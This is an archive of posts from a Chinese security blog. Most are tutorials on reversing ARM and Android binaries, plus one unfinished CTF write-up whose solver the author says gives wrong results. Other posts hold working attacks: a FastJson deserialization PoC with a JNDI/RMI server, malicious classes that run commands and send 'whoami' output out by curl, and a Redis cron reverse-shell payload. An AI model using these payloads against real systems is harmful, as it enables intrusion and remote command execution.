在MainActivity$1.smali中看到了jni的调用getResult方法。 .method public onClick(Landroid/view/View;)V .locals 3 .param p1, &quot;v&quot; # Landroid/view/View; .prologue .line 24 iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity; iget-object v2, v2, Lcom/example/test/ctf03/MainActivity;-&gt;pwd:Landroid/widget/EditText; invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v2 invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v1 .line 25 .local v1, &quot;str&quot;:Ljava/lang/String; invoke-static {v1}, Lcom/example/test/ctf03/JNI;-&gt;getResult(Ljava/lang/String;)I move-result v0 .line 26 .local v0, &quot;result&quot;:I iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity; invoke-virtual {v2, v0}, Lcom/example/test/ctf03/MainActivity;-&gt;Show(I)V .line 27 return-void .end method 使用IDA打开lib目录下的libNative.so文件。 在Exports中找到对应的方法，在F5一下查看伪代码 此处先判断是否是长度为15位，然后用malloc申请三个长度为一字节的变量来初始化。至于Init函数是做什么用的。在如下处，点击进入，看到其中又调用了Init函数，再点击进入。 .text:000011B0 MOV R3, R8 ; char * .text:000011B2 BLX j__Z4InitPcS_S_PKci 在如下地址处： 不过，并没看懂这是啥意思。。。。先继续往下看。 后面使用了First函数进行处理，如下处。 .text:000011B6 MOV R0, R6 ; char * .text:000011B8 BLX j__Z5FirstPc ; First(char *) .text:000011BC CBZ R0, loc_11DA 点击到函数内找到First函数，查看F5 signed int __fastcall First(char *a1) { int v1; // r1@1 int v2; // r0@3 signed int v3; // r1@3 v1 = 0; do { a1[v1] = 2 * a1[v1] ^ 0x80; ++v1; } while ( v1 != 4 ); v2 = strcmp(a1, &quot;LN^dl&quot;); v3 = 0; if ( !v2 ) v3 = 1; return v3; } 把传进来的字符串进行按位乘2和0x80异或，如果等于LN^dl，返回v3为1，不等于则返回v3为0。那么此处需要v3等不等于0呢，查看主要函数的下一步判断是if非，跳转到LABEL_14处，那么需要v3不为0，也就是a1等于LN^dl。同样代表了传入的字符串要乘2异或0x80后等于LN^dl。 其中需要v4跟一个字符串对于，字符串为以下 0x20, 0x35, 0x2D, 0x16, 0x61 整体的逻辑就是先分成三个字符串，然后判断第一个异或处理后是否为LN^dl，是的话对下一个字符串异或，对比相等，继续处理最后一个字符串，等于AFBo}则返回需要的1。那么就剩下一个Init不确定意义，根据分配的大小和函数的内容，猜测应该是把15位的字符串，每一位分配给三个字符串组，毕竟Init中有一个循环操作，且标志增加。也就是 123456分配两组： 135 246 尝试写脚本反向异或出原字符串。 str1 = &quot;LN^dl&quot; #v3 str2 = [0x20, 0x35, 0x2D, 0x16, 0x61] #v4 str3 = &quot;AFBo}&quot; #v5 flagstr1 = &#39;&#39; flagstr2 = &#39;&#39; flagstr3 = &#39;&#39; i = 0 while i&lt;=4: flagstr = str2[i] ^ ord(str3[i]) flagstr3 = flagstr3 + chr(flagstr) i+=1 print(flagstr3) #原字符串后部分 i= 0 while i&lt;=4: flagstr = ord(str1[i]) ^ str2[i] flagstr2 = flagstr2 + chr(flagstr) i+=1 print(flagstr2) #原字符串中间部分 i=0 while i&lt;=4: flagstr = (ord(str1[i])^ 0x80 ) // 2 flagstr1 = flagstr1 + chr(flagstr) i+=1 print(flagstr1) #原字符串开始部分 flagstr = &#39;&#39; for x in range(len(str1)): flagstr4 = flagstr1[x]+flagstr2[x]+flagstr3[x] flagstr = flagstr + flagstr4 print(flagstr) 但是结果很怪，肯定是后面出了问题，但是理论上异或处理是错的，不该只出现在最后一位上，后面找了官方的WP，看了别人的Java版poc，感觉也一样。莫非是一些编码和语言上处理的差别？暂时没处理掉此问题。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"结构体链表逆向","slug":"结构体链表逆向","date":"2019-07-26T09:23:50.000Z","updated":"2019-07-26T09:56:41.098Z","comments":true,"path":"2019/07/结构体链表逆向/","link":"","permalink":"/2019/07/结构体链表逆向/","excerpt":"","text":"结构体链表逆向同样使用如下的C代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct _student { char name[32]; int age; struct _student * next; }T_student; T_student * head = NULL; void Insert(const char *name,int age) { T_student * newnode; newnode = (T_student *)malloc(sizeof(T_student)); newnode-&gt;age = age; newnode-&gt;next = head; strcpy(newnode-&gt;name,name); head = newnode; } void PrintStudent() { T_student * tmp; tmp = head; while(tmp) { printf(&quot;name:%s age:%d\\n&quot;,tmp-&gt;name,tmp-&gt;age); tmp=tmp-&gt;next; } } int main() { Insert(&quot;Panda&quot;,15); Insert(&quot;Dog&quot;,3); Insert(&quot;Cat&quot;,2); Insert(&quot;XiaoMing&quot;,20); PrintStudent(); } 按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。 点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。 后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。 获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。 实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。 至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ARM数组重定向","slug":"ARM数组重定向","date":"2019-07-26T09:23:36.000Z","updated":"2019-07-26T09:56:13.330Z","comments":true,"path":"2019/07/ARM数组重定向/","link":"","permalink":"/2019/07/ARM数组重定向/","excerpt":"","text":"ARM数组重定向使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下： #include &lt;stdio.h&gt; // Arrays int g_Table[100]; int g_Table2[100]; void PrintAddr() { printf(&quot;g_Table:0x%x\\ng_Table2:%x\\n&quot;,g_Table,g_Table2); } void InitTable() { int i; for(i=0;i&lt;100;i++) g_Table[i] = i; printf(&quot;Table1 init ok\\n&quot;); for(i=0;i&lt;100;i++) g_Table2[i] = i; } int search(int key) { int i=0; for(;i&lt;100;i++) { if(g_Table[i]==key) return i; } return -1; } int read(int x) { return g_Table[x]; } void write(int x,int value) { g_Table[x] = value; } int main() { int idx; PrintAddr(); InitTable(); write(2,200); write(6,900); if((idx = search(200))!=-1) write(idx,400); } 利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫 选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。 而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。 .text:00000400 LDR R2, =(g_Table_ptr - 0x1FE4) .text:00000404 LDR R2, [R3,R2] ; g_Table 回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始， 在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。 当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。 继续查看第二个循环体，由于跟第一个循环一致，不在细看。 分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。 函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。 在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下 R1 = array[var_8] = array[i] R3 = var_10 = 200 if array[var_8] == var_10: return var_8 最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Redis 主从复制","slug":"Redis-主从复制","date":"2019-07-15T02:16:27.000Z","updated":"2019-07-15T02:37:01.336Z","comments":true,"path":"2019/07/Redis-主从复制/","link":"","permalink":"/2019/07/Redis-主从复制/","excerpt":"","text":"Redis主从复制redis主从复制，前几天分享的新版redis未授权利用的新型方式。 什么是主从复制，http://blog.itpub.net/31545684/viewspace-2213629/ 通过redis命令来设置主从机 127.0.0.1:6379&gt; slaveof 192.168.253.131 6379 被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。 首先需要一个高版本的redis服务，https://redis.io/download。下载后按照官网给的安装步骤来安装。 安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。 执行命令：src/redis-server ./redis.conf，开启redis成功。 下载脚本：https://github.com/Dliv3/redis-rogue-server。启动执行脚本 脚本执行完后显示： 同时可以看到redis日志中加载了so文件： 连接redis执行命令： 所以在未授权访问和弱密码登陆的情况下此问题才可以利用。 原文章：https://paper.seebug.org/975/","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"FastJson 反序列化","slug":"FastJson-反序列化","date":"2019-07-15T02:16:07.000Z","updated":"2019-07-15T02:35:30.420Z","comments":true,"path":"2019/07/FastJson-反序列化/","link":"","permalink":"/2019/07/FastJson-反序列化/","excerpt":"","text":"FastJson 反序列化前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。 先下载1.2.47的FastJson，地址：http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar 利用的JDK为，java_8u60。地址：https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe 使用的IDE为IDEA，下载FastJson后导入IDEA。 从File - Project Structure - Modules - Dependencies导入 创建poc为如下： import com.alibaba.fastjson.JSON; public class poc { public static void main(String[] argv) { String payload = &quot;{\\&quot;name\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},&quot; + &quot;\\&quot;xxxx\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:&quot; + &quot;\\&quot;rmi://localhost:1099/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}}}&quot;; JSON.parse(payload); } } 创建一个RMI服务器。可以利用如下的JAVA代码。 import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class rmiServer { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(&quot;Exloit&quot;, &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(&quot;Exploit&quot;,referenceWrapper); } } 或者采用mar创建一个RMI服务器。 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit 再开启一个HTTP服务，下面写入一个恶意class文件。 import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class Exploit implements ObjectFactory { @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) { exec(&quot;xterm&quot;); return null; } public static String exec(String cmd) { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { e.printStackTrace(); } return &quot;&quot;; } public static void main(String[] args) { exec(&quot;123&quot;); } } 此处利用mar创建的RMI服务器来验证： 查看HTTP服务，可以看到请求的恶意class请求。 如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333 当然如果也可以使用之前老RCE的恶意class文件 import java.io.BufferedInputStream; import java.io.BufferedReader; import java.io.InputStreamReader; public class exploit2 { public static String exec(String cmd) throws Exception { String sb = &quot;&quot;; BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr = inBr.readLine()) != null) sb += lineStr + &quot;\\n&quot;; inBr.close(); in.close(); return sb; } public exploit2() throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://localhost:8000/&quot;+result; throw new Exception(exec(cmd)); } public static void main(String[] args) throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://localhost:8000/&quot;+result; throw new Exception(exec(cmd)); } } 执行后，查看携带响应的请求 内容部分POC来源：https://www.03sec.com/3240.shtml","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"逆向函数分析引用","slug":"逆向函数分析引用","date":"2019-07-09T08:56:32.000Z","updated":"2019-07-26T09:56:38.114Z","comments":true,"path":"2019/07/逆向函数分析引用/","link":"","permalink":"/2019/07/逆向函数分析引用/","excerpt":"","text":"代码编译，使用代码如下: #include &lt;stdio.h&gt; #include &lt;string.h&gt; int fun1() { int a; int b; b=10; a=b++; return a; } int fun2(int a,int b) { return a+b+fun1(); } int fun3(int a,int b,int c,int d,int e,int f,int g,int h) { if(a+b+c &lt; d+e+f){ return a+b+c+fun2(a,f); }else if(a+b+c &gt; d+e+f){ return a+b+c+fun2(b,e); }else{ return 0; } } int main() { int tmp; printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8)); return 0; } makefile文件同之前的基本一致 #设置目录 NDK_ROOT=D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT=$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT=$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE=$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB=$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME=app6 BUILD_TYPE=c PATH_ANDROID=/data/local/tmp/ RM=del FLAGS=-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS=$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下： 其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义 r0-r3 用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。 r4-r11 被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。 r12 是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。 r13 是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。 r14 是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复 r15 是程序计数器 PC。它不能用于任何其它用途。 详细介绍参考：https://www.veryarm.com/36274.html 到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。 判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。 点击fun2，其中又调用了fun1函数，同样点击fun1。 通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。 而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。 这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。 此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ARM原生循环语句逆向分析","slug":"ARM原生循环语句逆向分析","date":"2019-07-03T07:09:57.000Z","updated":"2019-07-26T09:56:09.610Z","comments":true,"path":"2019/07/ARM原生循环语句逆向分析/","link":"","permalink":"/2019/07/ARM原生循环语句逆向分析/","excerpt":"","text":"代码编译使用的代码为非虫的Android软件安全权威指南，app6.c 代码如下： #include &lt;stdio.h&gt; int nums[5] = {1, 2, 3, 4, 5}; int for1(int n) { int i = 0; int s = 0; for (i = 0; i &lt; n; i++) { s += i * 2; } return s; } int for2(int n) { int i = 0; int s = 0; for (i = 0; i &lt; n; i++) { s += i * i + nums[n - 1]; } return s; } int dowhile(int n) { int i = 1; int s = 0; do { s += i; } while (i++ &lt; n); return s; } int whiledo(int n) { int i = 1; int s = 0; while (i &lt;= n) { s += i++; } return s; } void if1(int n) { if (n &lt; 10) { printf(&quot;the number less than 10\\n&quot;); } else { printf(&quot;the number greater than or equal to 10\\n&quot;); } } void if2(int n) { if (n &lt; 16) { printf(&quot;he is a boy\\n&quot;); } else if (n &lt; 30) { printf(&quot;he is a young man\\n&quot;); } else if (n &lt; 45) { printf(&quot;he is a strong man\\n&quot;); } else { printf(&quot;he is an old man\\n&quot;); } } int main(int argc, char *argv[]) { printf(&quot;for1:%d\\n&quot;, for1(5)); printf(&quot;for2:%d\\n&quot;, for2(5)); printf(&quot;dowhile:%d\\n&quot;, dowhile(100)); printf(&quot;while:%d\\n&quot;, whiledo(100)); if1(5); if2(35); return 0; } 删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下： #设置目录 NDK_ROOT=D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT=$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT=$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE=$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB=$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME=app6 BUILD_TYPE=c PATH_ANDROID=/data/local/tmp/ RM=del FLAGS=-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS=$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。 1. for1函数查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。 loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。 按照以上逻辑写一段C代码，如下： int for1(int var_10){ int var_8 = 0; int var_c = 0; for(var_8 = 0; var_8 &lt; var_10; var_8++){ var_c = var_c + var_8 &lt;&lt; 1; } return var_c; } 2. for2函数for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。 C代码： int nums[5] = {1,2,3,4,5}; int for2(int var_10){ int var_8 = 0; int var_c = 0; for(var_8 = 0; var_8 &lt; var_10; var_8++){ var_c =var_c + var_8* var_8 + nums[var_10 - 1]; } return var_c; } 3. dowhile函数其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。 根据汇编代码写出大致的C代码。 int dowhile(int var_10){ int var_8 = 1; int var_c = 0; do{ var_c = var_8 + var_c; var_8 = var_8 + 1; }while(var_8 &lt; var_10) return var_c } 4. whiledo函数whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。 根据汇编代码写出大致的C代码。 int whiledo(int var_10){ int var_8 = 1; int var_c = 0; while(var_8 &lt;= var_10){ var_8 = var_8 + 1; var_c = var_c + var_8; } return var_c } 5. if1 函数如下，具有单分支的if结构体可以看出是if-else判断形式 按照汇编意思，C代码如下： void if1(int var_8){ if(var_8 &gt; 9){ puts(&quot;the number greater than or equal to 10&quot;); }else{ puts(&quot;the number less than 10&quot;); } } 在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\\n。 void if1(int var_8){ if(var_8 &lt;= 9){ puts(&quot;the number less than 10&quot;); }else{ puts(&quot;the number greater than or equal to 10&quot;); } } 6. if2函数多判断结构体，也就是if-else-if 其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。 LDR R3, =(aHeIsABoy - 0x5D0) 代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：https://www.cnblogs.com/ichunqiu/p/9056630.html 也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。 用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。 LDR R3, =(aHeIsABoy - 0x5D0) //000007EC aHeIsABoy DCB &quot;he is a boy&quot;,0 ADD R3, PC, R3 ; &quot;he is a boy&quot; MOV R0, R3 ; s BL puts B loc_628 按照汇编意思，C代码如下： void if2(int var_8){ if(var_8 &gt; 15){ if(var_8 &gt; 29){ if(var_8 &gt; 44){ puts(&quot;he is an old man&quot;); } else{ puts(&quot;he is a strong man&quot;); } } else{ puts(&quot;he is a young man&quot;); } } else{ puts(&quot;he is a boy&quot;); } } 由于汇编对判断的形式，用else if的形式可以这么写 void if2(int var_8){ if(var_8 &lt;= 15){ puts(&quot;he is a boy&quot;); } else if(var_8 &lt;= 29){ puts(&quot;he is a young man&quot;); } else if(var_8 &lt;= 44){ puts(&quot;he is a strong man&quot;); } else{ puts(&quot;he is an old man&quot;); } } 看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下： .... //汇编代码 B loc_xxx .... CMP r1, r2 BXX loc_xxx .... BX LR 判断形式一般为以下： .... CMP R1, R2 BXX loc_xxx .... loc_xxx .... B loc_zzz loc_zzz .... 当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如： CMP R2, R3 ADDEQ R2, R3, #1 其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下： LDR R3, [R11,#var_8] LDR R2, [R11,#var_C] ADD R3, R2, R3 在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成： a = 1; b = 2; a = a + b; //3 所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。 main 函数main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。 同时返回值在R0中。 下部汇编类似，就不在一步步看啦。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"越权/未授权访问","slug":"越权-未授权访问","date":"2019-06-18T03:27:13.000Z","updated":"2019-06-18T07:00:48.215Z","comments":true,"path":"2019/06/越权-未授权访问/","link":"","permalink":"/2019/06/越权-未授权访问/","excerpt":"","text":"0x01、漏洞简介未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：垂直越权，水平越权。而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。 0x02、漏洞原理未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。 0x03、漏洞危害未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。 0x04、漏洞测试方法0x04-1、常见的未授权服务0x04-1-1、redis未授权访问此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。 root@kali:~# redis-cli -h 192.168.63.130 192.168.63.130:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot; OK 192.168.63.130:6379&gt; config set dir /var/spool/cron/ OK 192.168.63.130:6379&gt; config set dbfilename root OK 192.168.63.130:6379&gt; save OK 0x04-1-2、Jenkins未授权访问默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 http://www.secpulse.com:8080/manage http://www.secpulse.com:8080/script 选择脚本命令行可以执行一些系统命令。 